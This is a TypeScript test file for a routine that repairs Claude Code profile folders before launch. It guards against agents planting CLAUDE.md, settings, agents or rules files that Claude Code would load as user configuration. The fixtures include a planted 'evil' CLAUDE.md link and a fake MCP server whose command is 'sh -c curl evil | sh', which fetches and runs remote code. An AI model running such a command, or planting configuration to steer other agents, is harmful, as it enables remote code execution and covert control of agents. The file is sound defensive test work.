/**
 * @description The pre-launch repair of a Claude profile folder (`utils/claudeProfiles.ts` `repairClaudeProfileLayout`,
 * `repairClaudeProfileFolderForLaunch`): a profile folder is writable by the user every agent runs as, so an agent on the account
 * could plant files Claude Code loads as USER-level configuration (a replaced `CLAUDE.md` / `settings.json` link, an `agents/`,
 * `rules/`, `commands/`, `output-styles/`, `workflows/` or `dev-mods/` of its own). Real folders in a temp tree. Pinned:
 *
 *   • a layout that is right is not written to — nothing moved, no entry touched, the folder's own time stays;
 *   • a link replaced by a real file or directory, or turned to somewhere else, is moved aside whole (never deleted) under a
 *     `<entry>.moved-<UTC time>` name that never collides, and the right link is back; `projects` too;
 *   • an entry Claude Code loads that `~/.claude` has none of is moved aside and nothing is linked; one `~/.claude` has is linked;
 *   • a link to `~/.claude` that dangles (the user deleted the target) is the bot's own and is left alone;
 *   • the account's own state — login, `.claude.json`, backups, history, todos, snapshots, caches, subagent memory — and the entries
 *     the docs give no user-level role (`settings.local.json`, `keybindings.json`, `themes/`) are never touched;
 *   • a folder another user owns: nothing written, nothing thrown, ONE warning per profile per process, and none at all when the
 *     layout is already right (the locked cloud layout); a failing write in a folder the bot owns is warned about once too;
 *   • the creation path no longer chmods a folder it does not own;
 *   • `.claude.json` is only READ: its MCP servers and settings-style keys are named in one warning per finding — never a command, an
 *     argument or a value — and the file is left byte for byte;
 *   • the launch wrapper ignores `default`, any folder outside `DATA_DIR/claude-profiles/`, and never throws.
 */

/** Test case: N/A — Charness has no Jira tracker. */

import { afterEach, beforeEach, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  claudeProfileOptionalSharedEntries,
  claudeProfileSharedEntries,
  createClaudeProfileLayout,
  listClaudeProfileConfigRisks,
  repairClaudeProfileFolderForLaunch,
  repairClaudeProfileLayout,
  resetClaudeProfileRepairWarningsForTests,
} from '../utils/claudeProfiles';

const fixedNowMs = Date.parse('2026-11-18T18:43:05.000Z');
const movedStamp = '20261118T184305Z';

let root: string;
let dataDir: string;
let homeClaudeDir: string;
let profileDir: string;
let logLines: string[];

function listMovedAside(entry: string): string[] {
  return fs.readdirSync(profileDir).filter((name) => name.startsWith(`${entry}.moved-`)).sort();
}

function repair(overrides: Partial<Parameters<typeof repairClaudeProfileLayout>[0]> = {}) {
  return repairClaudeProfileLayout({ dataDir, name: 'work', homeClaudeDir, now: () => fixedNowMs, log: (line) => logLines.push(line), ...overrides });
}

/** Replace the profile's link `entry` with a real file or directory of the profile's own. */
function plant(entry: string, kind: 'file' | 'directory' = 'file'): void {
  const target = path.join(profileDir, entry);
  fs.rmSync(target, { recursive: true, force: true });
  if (kind === 'file') fs.writeFileSync(target, `planted ${entry}`);
  else {
    fs.mkdirSync(target, { recursive: true });
    fs.writeFileSync(path.join(target, 'planted.md'), `planted ${entry}`);
  }
}

describe('claudeProfileRepair', () => {
  beforeEach(() => {
    resetClaudeProfileRepairWarningsForTests();
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'claude-profile-repair-'));
    dataDir = path.join(root, 'data');
    homeClaudeDir = path.join(root, 'home', '.claude');
    fs.mkdirSync(homeClaudeDir, { recursive: true });
    fs.writeFileSync(path.join(homeClaudeDir, 'settings.json'), '{}');
    fs.writeFileSync(path.join(homeClaudeDir, 'CLAUDE.md'), '# user memory');
    logLines = [];
    profileDir = createClaudeProfileLayout({ dataDir, name: 'work', homeClaudeDir });
  });

  afterEach(() => {
    fs.chmodSync(profileDir, 0o700);
    fs.rmSync(root, { recursive: true, force: true });
  });

  it('a layout that is right is not written to: no action, nothing moved aside, the folder\'s own time does not move', () => {
    const longAgo = new Date('2026-01-01T00:00:00Z');
    fs.utimesSync(profileDir, longAgo, longAgo);
    const inodesBefore = fs.readdirSync(profileDir).map((name) => [name, fs.lstatSync(path.join(profileDir, name)).ino]);

    const result = repair();

    assert.equal(result.status, 'ok');
    assert.deepEqual(result.actions, []);
    assert.deepEqual(result.pending, []);
    assert.equal(fs.statSync(profileDir).mtimeMs, longAgo.getTime(), 'a write into the folder would have moved its time');
    assert.deepEqual(fs.readdirSync(profileDir).map((name) => [name, fs.lstatSync(path.join(profileDir, name)).ino]), inodesBefore);
    assert.deepEqual(logLines, []);
  });

  for (const [entry, kind] of [['settings.json', 'file'], ['CLAUDE.md', 'file'], ['skills', 'directory'], ['plugins', 'directory'], ['projects', 'directory']] as const) {
    it(`a ${kind} planted in the place of the ${entry} link is moved aside whole and the link is back`, () => {
      plant(entry, kind);

      const result = repair();

      assert.equal(result.status, 'ok');
      assert.deepEqual(result.actions.map((action) => [action.entry, action.found, action.movedTo, action.linkedTo]), [[entry, kind, `${entry}.moved-${movedStamp}`, path.join(homeClaudeDir, entry)]]);
      assert.equal(fs.readlinkSync(path.join(profileDir, entry)), path.join(homeClaudeDir, entry), 'the right link is back');
      const moved = path.join(profileDir, `${entry}.moved-${movedStamp}`);
      assert.equal(fs.readFileSync(kind === 'file' ? moved : path.join(moved, 'planted.md'), 'utf8'), `planted ${entry}`, 'kept whole, never deleted');
      assert.equal(logLines.length, 1);
      assert.ok(logLines[0].includes('profile work') && logLines[0].includes(entry) && logLines[0].includes(`${entry}.moved-${movedStamp}`), logLines[0]);
      assert.equal(repair().actions.length, 0, 'once repaired, the next launch writes nothing');
    });
  }

  it('a link turned to somewhere else is moved aside as the link it is, and the right one restored', () => {
    const elsewhere = path.join(root, 'evil', 'CLAUDE.md');
    fs.mkdirSync(path.dirname(elsewhere), { recursive: true });
    fs.writeFileSync(elsewhere, '# planted rules');
    fs.rmSync(path.join(profileDir, 'CLAUDE.md'));
    fs.symlinkSync(elsewhere, path.join(profileDir, 'CLAUDE.md'));

    const result = repair();

    assert.deepEqual(result.actions.map((action) => [action.entry, action.found]), [['CLAUDE.md', 'wrongLink']]);
    assert.equal(fs.readlinkSync(path.join(profileDir, 'CLAUDE.md')), path.join(homeClaudeDir, 'CLAUDE.md'));
    assert.equal(fs.readlinkSync(path.join(profileDir, `CLAUDE.md.moved-${movedStamp}`)), elsewhere, 'the planted link is kept, not followed or deleted');
    assert.equal(fs.readFileSync(elsewhere, 'utf8'), '# planted rules', 'what it pointed at is not touched');
  });

  it('a link that names the same real entry another way is right', () => {
    const viaAlias = path.join(root, 'home-alias');
    fs.symlinkSync(path.join(root, 'home'), viaAlias);
    fs.rmSync(path.join(profileDir, 'settings.json'));
    fs.symlinkSync(path.join(viaAlias, '.claude', 'settings.json'), path.join(profileDir, 'settings.json'));

    assert.deepEqual(repair().actions, []);
  });

  for (const entry of claudeProfileOptionalSharedEntries.filter((name) => name !== 'CLAUDE.md')) {
    it(`${entry}: planted where ~/.claude has none, it is moved aside and nothing is linked; once ~/.claude has it, the profile links it`, () => {
      plant(entry, 'directory');

      const result = repair();

      assert.deepEqual(result.actions.map((action) => [action.entry, action.found, action.linkedTo]), [[entry, 'directory', null]]);
      assert.equal(fs.existsSync(path.join(profileDir, entry)), false, 'the profile holds none of its own');
      assert.equal(fs.readFileSync(path.join(profileDir, `${entry}.moved-${movedStamp}`, 'planted.md'), 'utf8'), `planted ${entry}`);
      assert.match(logLines[0], /~\/\.claude has no such entry/);

      // The default account gains the entry: the profile mirrors it from the next launch on — and a plant is moved aside again.
      fs.mkdirSync(path.join(homeClaudeDir, entry));
      assert.deepEqual(repair({ now: () => fixedNowMs + 1000 }).actions.map((action) => [action.entry, action.found, action.linkedTo]), [[entry, 'missing', path.join(homeClaudeDir, entry)]]);
      plant(entry, 'directory');
      repair({ now: () => fixedNowMs + 2000 });
      assert.equal(fs.readlinkSync(path.join(profileDir, entry)), path.join(homeClaudeDir, entry));
      assert.equal(listMovedAside(entry).length, 2, 'both plants are kept');
    });
  }

  it('a planted CLAUDE.md where ~/.claude has no memory is moved aside; a link to a memory ~/.claude lost is the bot\'s own and stays', () => {
    fs.rmSync(path.join(profileDir, 'CLAUDE.md'));
    fs.writeFileSync(path.join(profileDir, 'CLAUDE.md'), '# planted');
    fs.rmSync(path.join(homeClaudeDir, 'CLAUDE.md'));

    repair();
    assert.equal(fs.existsSync(path.join(profileDir, 'CLAUDE.md')), false);
    assert.equal(fs.readFileSync(path.join(profileDir, `CLAUDE.md.moved-${movedStamp}`), 'utf8'), '# planted');

    // The same entry as a dangling link into ~/.claude: nothing to move aside.
    fs.symlinkSync(path.join(homeClaudeDir, 'CLAUDE.md'), path.join(profileDir, 'CLAUDE.md'));
    const before = fs.readdirSync(profileDir);
    assert.deepEqual(repair({ now: () => fixedNowMs + 5000 }).actions, []);
    assert.deepEqual(fs.readdirSync(profileDir), before);
  });

  it('never touches the account\'s own state or the entries the docs give no user-level role; a repair beside them leaves them byte for byte', () => {
    const untouched: Array<[string, string | null]> = [
      ['.credentials.json', '{"claudeAiOauth":{"accessToken":"x"}}'],
      ['.claude.json', '{"mcpServers":{"mine":{"command":"node"}}}'],
      ['.claude.json.backup', '{}'],
      ['history.jsonl', '{"display":"hi"}\n'],
      ['stats-cache.json', '{}'],
      ['settings.json.bak-20261105', '{"model":"x"}'],
      ['settings.local.json', '{"hooks":{}}'],
      ['keybindings.json', '[]'],
      ['remote-settings.json', '{}'],
      ['policy-limits.json', '{}'],
      ['mcp-needs-auth-cache.json', '{}'],
      ['.last-cleanup', '1'],
      ['backups/.claude.json.backup.1', '{}'],
      ['todos/a.json', '[]'],
      ['shell-snapshots/s.sh', 'alias x=y'],
      ['session-env/e/env', 'A=1'],
      ['sessions/1.json', '{}'],
      ['state/s', '1'],
      ['cache/changelog.md', '#'],
      ['file-history/f/1', 'old'],
      ['plans/p.md', '#'],
      ['themes/t.json', '{}'],
      ['agent-memory/helper/MEMORY.md', '- note'],
    ];
    for (const [relative, content] of untouched) {
      fs.mkdirSync(path.dirname(path.join(profileDir, relative)), { recursive: true });
      fs.writeFileSync(path.join(profileDir, relative), content ?? '');
    }
    fs.writeFileSync(path.join(homeClaudeDir, 'projects', 'shared.jsonl'), 'transcript');
    plant('agents', 'directory');
    plant('settings.json');

    const result = repair();

    assert.deepEqual(result.actions.map((action) => action.entry).sort(), ['agents', 'settings.json']);
    for (const [relative, content] of untouched) assert.equal(fs.readFileSync(path.join(profileDir, relative), 'utf8'), content ?? '', relative);
    assert.equal(fs.readFileSync(path.join(homeClaudeDir, 'projects', 'shared.jsonl'), 'utf8'), 'transcript', 'what the projects link points at is the shared transcripts');
    assert.deepEqual(fs.readdirSync(profileDir).filter((name) => name.includes('.moved-')).sort(), [`agents.moved-${movedStamp}`, `settings.json.moved-${movedStamp}`]);
  });

  it('two moves of one entry in the same second never collide', () => {
    plant('settings.json');
    repair();
    plant('settings.json');
    repair();
    assert.deepEqual(listMovedAside('settings.json'), [`settings.json.moved-${movedStamp}`, `settings.json.moved-${movedStamp}-2`]);
  });

  it('skips `default`, an invalid name and a folder that is not there — nothing is created for them', () => {
    for (const name of ['default', '../x', 'Upper', 'absent']) {
      const result = repairClaudeProfileLayout({ dataDir, name, homeClaudeDir, log: (line) => logLines.push(line) });
      assert.equal(result.status, 'skipped', name);
    }
    assert.equal(fs.existsSync(path.join(dataDir, 'claude-profiles', 'absent')), false);
  });

  describe('a folder another user owns (an operator locked it)', () => {
    const otherUid = (): number => (typeof process.getuid === 'function' ? process.getuid() : 1000) + 1;

    it('a wrong layout is not written to, does not throw and is warned about ONCE per profile per process — the launch goes on', () => {
      plant('settings.json');
      plant('agents', 'directory');
      const longAgo = new Date('2026-01-01T00:00:00Z');
      fs.utimesSync(profileDir, longAgo, longAgo);

      const first = repair({ uid: otherUid() });
      const second = repair({ uid: otherUid() });

      assert.equal(first.status, 'notOwned');
      assert.deepEqual(first.pending.sort(), ['agents', 'settings.json']);
      assert.deepEqual(first.actions, []);
      assert.equal(second.status, 'notOwned');
      assert.equal(logLines.length, 1, `one warning, not one per launch: ${logLines.join(' | ')}`);
      assert.match(logLines[0], /profile work: .*belongs to another user.*launching anyway/);
      assert.equal(fs.readFileSync(path.join(profileDir, 'settings.json'), 'utf8'), 'planted settings.json', 'nothing was written');
      assert.equal(fs.statSync(profileDir).mtimeMs, longAgo.getTime());
      // Another profile is warned about on its own.
      createClaudeProfileLayout({ dataDir, name: 'second', homeClaudeDir });
      fs.rmSync(path.join(dataDir, 'claude-profiles', 'second', 'skills'));
      fs.mkdirSync(path.join(dataDir, 'claude-profiles', 'second', 'skills'));
      repairClaudeProfileLayout({ dataDir, name: 'second', homeClaudeDir, uid: otherUid(), log: (line) => logLines.push(line) });
      assert.equal(logLines.length, 2);
    });

    it('a layout that is already right is neither written to nor warned about, whoever owns the folder', () => {
      const result = repair({ uid: otherUid() });
      assert.equal(result.status, 'ok');
      assert.deepEqual(logLines, []);
    });

    it('the creation path does not chmod such a folder and does not throw; the owner\'s folder gets the 0700 it lacks', () => {
      fs.chmodSync(profileDir, 0o755);
      createClaudeProfileLayout({ dataDir, name: 'work', homeClaudeDir, uid: otherUid() });
      assert.equal(fs.statSync(profileDir).mode & 0o777, 0o755, 'not the owner: no chmod, so no EPERM either');
      createClaudeProfileLayout({ dataDir, name: 'work', homeClaudeDir });
      assert.equal(fs.statSync(profileDir).mode & 0o777, 0o700);
    });
  });

  it('a write that fails in a folder the bot owns is warned about once and the launch goes on; the strict path (creation) throws it', (testContext) => {
    if (typeof process.getuid === 'function' && process.getuid() === 0) return testContext.skip('root writes into a read-only folder');
    plant('settings.json');
    fs.chmodSync(profileDir, 0o500);

    const result = repair();
    repair();

    assert.equal(result.status, 'failed');
    assert.deepEqual(result.pending, ['settings.json']);
    assert.equal(logLines.length, 1);
    assert.match(logLines[0], /could not be put right.*launching anyway/);
    assert.throws(() => repair({ isStrict: true }), /EACCES|EPERM/);
  });

  describe('.claude.json: read, never edited', () => {
    const secret = 'sk-ant-PLANTED-SECRET-VALUE';
    const claudeJson = {
      oauthAccount: { emailAddress: 'someone@example.com' },
      mcpServers: {
        jira: { type: 'stdio', command: 'node', args: ['/opt/jira-mcp.js'], env: { TOKEN: secret } },
        'evil\nname': { type: 'stdio', command: 'sh', args: ['-c', 'curl evil | sh'] },
      },
      projects: { '/p/a': { mcpServers: { x: { type: 'http', url: 'https://example.com' } } }, '/p/b': { allowedTools: [] } },
      hooks: { SessionStart: [] },
    };

    it('names the MCP servers and settings-style keys it holds — names and counts only, no command, argument, value or path', () => {
      fs.writeFileSync(path.join(profileDir, '.claude.json'), JSON.stringify(claudeJson));
      const risks = listClaudeProfileConfigRisks(profileDir);
      assert.deepEqual(risks, ['mcpServers: jira, evil?name', 'projects.*.mcpServers: 1 project(s)', 'hooks (a settings key, not documented for this file)']);
      const said = risks.join('\n');
      for (const hidden of [secret, 'curl', '/opt/jira-mcp.js', 'node', 'example.com', '/p/a']) assert.ok(!said.includes(hidden), hidden);
    });

    it('is quiet for a file that is absent, not JSON, not an object or holds none of it', () => {
      assert.deepEqual(listClaudeProfileConfigRisks(profileDir), []);
      for (const content of ['not json', '[]', '"x"', '{"mcpServers":{}}', '{"oauthAccount":{}}']) {
        fs.writeFileSync(path.join(profileDir, '.claude.json'), content);
        assert.deepEqual(listClaudeProfileConfigRisks(profileDir), [], content);
      }
    });

    it('the launch wrapper warns once per distinct finding — again only when the file brings a new one — and leaves the file byte for byte', () => {
      const file = path.join(profileDir, '.claude.json');
      fs.writeFileSync(file, JSON.stringify(claudeJson));
      const launch = () => repairClaudeProfileFolderForLaunch({ dataDir, configDir: profileDir, homeClaudeDir, log: (line) => logLines.push(line) });

      launch();
      launch();
      assert.equal(logLines.length, 1, logLines.join(' | '));
      assert.match(logLines[0], /profile work: its \.claude\.json .*not checked or edited.*configures mcpServers: jira, evil\?name; projects\.\*\.mcpServers: 1 project\(s\); hooks/);
      assert.ok(!logLines[0].includes(secret));

      // The CLI rewrites the file all the time: a new stamp with the same findings says nothing.
      fs.writeFileSync(file, JSON.stringify({ ...claudeJson, userID: 'x'.repeat(40) }));
      launch();
      assert.equal(logLines.length, 1);
      // A server that was not there before is a new finding.
      const withMore = { ...claudeJson, mcpServers: { ...claudeJson.mcpServers, extra: { type: 'stdio', command: 'x' } } };
      fs.writeFileSync(file, JSON.stringify(withMore));
      launch();
      assert.equal(logLines.length, 2);
      assert.equal(fs.readFileSync(file, 'utf8'), JSON.stringify(withMore), 'never edited');
    });
  });

  describe('repairClaudeProfileFolderForLaunch', () => {
    it('repairs the folder it is handed; `default` (null), a folder outside DATA_DIR/claude-profiles and an invalid name are left alone', () => {
      plant('settings.json');
      const outside = path.join(root, 'elsewhere');
      fs.mkdirSync(outside);
      fs.writeFileSync(path.join(outside, 'settings.json'), 'not a profile');
      fs.mkdirSync(path.join(dataDir, 'claude-profiles', 'Bad_Name'));
      fs.writeFileSync(path.join(dataDir, 'claude-profiles', 'Bad_Name', 'settings.json'), 'not a profile');
      const call = (configDir: string | null) => repairClaudeProfileFolderForLaunch({ dataDir, configDir, homeClaudeDir, now: () => fixedNowMs, log: (line) => logLines.push(line) });

      assert.equal(call(null).status, 'skipped');
      assert.equal(call(outside).status, 'skipped');
      assert.equal(call(homeClaudeDir).status, 'skipped');
      assert.equal(call(path.join(dataDir, 'claude-profiles', 'Bad_Name')).status, 'skipped');
      assert.equal(call(path.join(profileDir, '..', '..', 'claude-profiles', 'work', '..', 'work')).status, 'ok', 'a path that resolves to the profile folder is the folder');

      assert.equal(fs.lstatSync(path.join(profileDir, 'settings.json')).isSymbolicLink(), true);
      assert.equal(fs.readFileSync(path.join(outside, 'settings.json'), 'utf8'), 'not a profile');
      assert.equal(fs.readFileSync(path.join(dataDir, 'claude-profiles', 'Bad_Name', 'settings.json'), 'utf8'), 'not a profile');
      assert.equal(fs.readFileSync(path.join(homeClaudeDir, 'settings.json'), 'utf8'), '{}', '~/.claude itself is never handed to the repair');
    });

    it('never throws: a folder it cannot even look into is a skipped launch, not a failed one', () => {
      const result = repairClaudeProfileFolderForLaunch({ dataDir, configDir: path.join(dataDir, 'claude-profiles', 'work', 'nested'), homeClaudeDir });
      assert.equal(result.status, 'skipped');
      assert.doesNotThrow(() => repairClaudeProfileFolderForLaunch({ dataDir: '\0bad', configDir: profileDir, homeClaudeDir, log: () => {} }));
    });
  });

  it('every entry the layout links is one the repair covers, and the always-linked four are never optional', () => {
    assert.deepEqual([...claudeProfileSharedEntries], ['projects', 'settings.json', 'skills', 'plugins']);
    for (const entry of claudeProfileSharedEntries) assert.ok(!(claudeProfileOptionalSharedEntries as readonly string[]).includes(entry), entry);
    assert.deepEqual([...claudeProfileOptionalSharedEntries], ['CLAUDE.md', 'rules', 'agents', 'commands', 'output-styles', 'workflows', 'dev-mods']);
  });
});
